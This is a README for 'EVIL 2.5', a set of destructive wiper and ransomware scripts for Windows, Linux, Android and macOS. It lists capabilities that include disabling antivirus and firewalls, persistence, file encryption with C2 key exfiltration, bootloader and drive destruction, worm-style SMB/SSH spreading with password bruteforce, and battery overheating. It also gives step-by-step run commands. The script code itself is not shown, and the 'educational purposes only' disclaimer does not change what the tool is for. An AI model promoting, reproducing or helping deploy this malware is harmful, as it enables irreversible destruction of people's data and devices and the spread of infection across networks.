# Evil-Collection-2.5
EVIL 2.5 - cross-platform collection of scripts for complete and irreversible destruction of OS, data and bootloader. Supports Windows, Linux, Android (root/no-root), macOS. Result - total device death. For educational purposes only in isolated environment. Responsibility lies with the runner

# EVIL 2.5 - Cross-Platform Destructive Collection

**Warning: These scripts are for educational purposes only in isolated virtual environments. Running on real hardware will cause irreversible data loss, OS destruction, and permanent device damage. The author assumes no responsibility for any damage.**

---

## Platform Capabilities

### Windows 
- Disables Windows Defender and Tamper Protection
- Multiple persistence methods (registry, startup, task scheduler, WMI)
- AES-256 file encryption (up to 5000 files)
- C2 key exfiltration with local backup
- Complete MBR and UEFI bootloader destruction
- Removes all partitions via diskpart
- Overwrites first 500MB of all drives
- Destroys registry, drivers, system files (winload, ntoskrnl, SAM, DLL)
- Disables all network adapters and Wi-Fi
- SMB network spreading with password bruteforce
- Fills all drives with garbage until 0 bytes free
- CPU and GPU stress
- Audio alarm and ASCII skull
- Self-deletion

### Linux 
- Disables ufw, iptables, firewalld, AppArmor, SELinux
- Persistence (cron, rc.local, systemd)
- GPG AES256 file encryption
- Destroys MBR and GRUB bootloader
- Wipes /boot, /efi, /sys/firmware/efi/efivars
- Overwrites all drives (sd*, nvme*, vd*, xvd*, mmcblk*, hd*)
- Deletes all partitions via fdisk
- Kills all network interfaces
- SCP/SSH network spreading with password bruteforce
- Deletes all non-root users
- Disables PCI and USB devices
- Destroys /etc, /usr, /var, /opt, /srv
- Deletes all binaries (/bin, /sbin, /lib, /usr/bin)
- CPU fork bomb and GPU stress (glxgears/bc)
- Audio alarm and animated ASCII skull
- Self-deletion

### Android Root 
- Gains root access
- Destroys bootloader (aboot, xbl, sbl1)
- Destroys recovery and boot (including A/B slots)
- Wipes all partitions (/dev/block/by-name/*, mmcblk*, sd*)
- Deletes /system, /data, /cache
- Encrypts files (rename + chmod 000)
- Disables Wi-Fi, Bluetooth, NFC, mobile data
- Network block via iptables
- Destroys IMEI and baseband
- CPU and GPU stress
- Battery overheating (max current request)
- Deletes contacts, SMS, call logs (content provider + SQLite)
- Removes all apps (pm clear + uninstall)
- Disables sensors, touchscreen, vibrator
- Kills display (fb0 blank)
- Max volume audio
- Self-deletion and reboot to bootloader

### Android No Root 
- Disables ADB, Wi-Fi, Bluetooth, airplane mode
- Destroys all user files (/sdcard/* with random overwrite)
- Deletes contacts, SMS, call logs
- Clears and removes user apps
- Disables system apps
- Full network block (iptables DROP)
- CPU and memory stress
- Input spam and window flooding
- Max volume audio playback
- Notification with skull
- Self-deletion and reboot

### macOS (evil_macos_2.5.sh)
- Disables Gatekeeper and firewall
- Launchd persistence
- GPG AES256 file encryption
- C2 key exfiltration
- Disables all network interfaces
- Destroys DNS and IPv6
- SCP/SSH network spreading
- Overwrites all drives (dd + diskutil erase + gpt destroy)
- Deletes drivers (/Library/Extensions)
- Destroys /etc, /usr/local/bin, /Library/Application Support
- Deletes all non-root users
- CPU and GPU stress
- Max volume audio (say + afplay)
- Finder alert dialog
- Deletes binaries (/bin, /sbin, /usr/bin, /usr/sbin)
- Self-deletion and halt

---

## How to Run

### Windows
1. Open PowerShell as Administrator
2. Run: `Set-ExecutionPolicy Bypass -Scope Process`
3. Run: `.\evil_windows_2.5.ps1`

### Linux / macOS
1. Open terminal
2. Make executable: `chmod +x evil_linux_2.5.sh`
3. Run as root: `sudo ./evil_linux_2.5.sh`

### Android (Root)
1. Install a terminal app (e.g., Termux)
2. Gain root access (Magisk or similar)
3. Run: `su -c "sh /sdcard/evil_android_root_2.5.sh"`

### Android (No Root)
1. Install Termux
2. Run: `sh /sdcard/evil_android_no_root_2.5.sh`

---

## License
MIT

## Author
Artem (RUS)
